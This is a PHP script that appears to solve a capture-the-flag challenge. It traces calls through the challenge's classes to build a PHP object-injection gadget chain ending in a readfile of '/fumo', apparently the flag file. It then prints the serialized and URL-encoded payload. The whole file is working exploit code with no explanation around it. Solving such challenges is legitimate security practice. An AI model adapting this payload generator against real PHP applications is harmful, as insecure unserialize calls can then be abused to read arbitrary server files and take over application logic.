<?php
$input = '/fumo';
$list = [];
$real_list = [];
$start = null;

function fake_base64_decode($value, $a) {
    global $list;
    $list[get_class($value)] = 'base64_encode';
    return $a;
}

function fake_str_rot13($value, $a) {
    global $list;
    $list[get_class($value)] = 'str_rot13';
    return $a;
}

function fake_ucfirst($value, $a) {
    global $list;
    $list[get_class($value)] = 'lcfirst';
    return $a;
}

function fake_strrev($value, $a) {
    global $list;
    $list[get_class($value)] = 'strrev';
    return $a;
}

function fake_readfile($value, $a) {
    global $input;
    global $real_list;
    global $list;
    global $start;

    if (!empty($a) && is_string($a) && strpos($input, $a) !== false) {
        $last_class = new stdClass;
        foreach (debug_backtrace() as $stack) {
            $real_list[] = $list[$stack['class']];

            if ($stack['class'] !== NULL) {
                $start = new $stack['class'];
                foreach (get_class_vars($stack['class']) as $field => $_) {
                    $start->$field = $last_class;
                }
                $last_class = $start;
            }
        }
    }
}

include "./test-copy.php";
(new christmasTree\WG7N5R3Mgx)->start($input);

$real_value = $input;
foreach ($real_list as $function) {
    if ($function !== NULL) {
        $real_value = $function($real_value);
    }
}

var_dump(serialize($start));
var_dump(urlencode(serialize($start)));
var_dump("W62OWE=".$real_value);